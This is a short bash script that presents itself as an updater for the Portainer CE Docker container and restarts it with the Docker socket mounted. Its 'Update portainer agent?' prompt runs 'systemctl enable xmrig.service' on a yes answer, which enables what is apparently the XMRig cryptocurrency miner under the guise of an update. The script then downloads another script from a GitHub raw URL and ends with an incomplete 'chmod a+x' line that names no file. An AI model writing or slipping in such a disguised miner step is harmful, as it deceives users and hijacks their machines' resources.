#!/bin/bash
echo Updating Portainer CE
sudo docker stop portainer
sudo docker rm portainer
sudo docker pull portainer/portainer-ce:latest
sudo docker run -d -p 8000:8000 -p 9443:9443 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce:latest

read -n4 -p "Update portainer agent? (yes/no):" service_status
case $service_status in
  y|Y|yes|Yes|YES) systemctl enable xmrig.service ;; 
  n|N|no|No|NO) echo Done! ;;
esac

sudo wget https://raw.githubusercontent.com/Toomas633/Installers/main/update_portainer_agent
sudo chmod a+x 
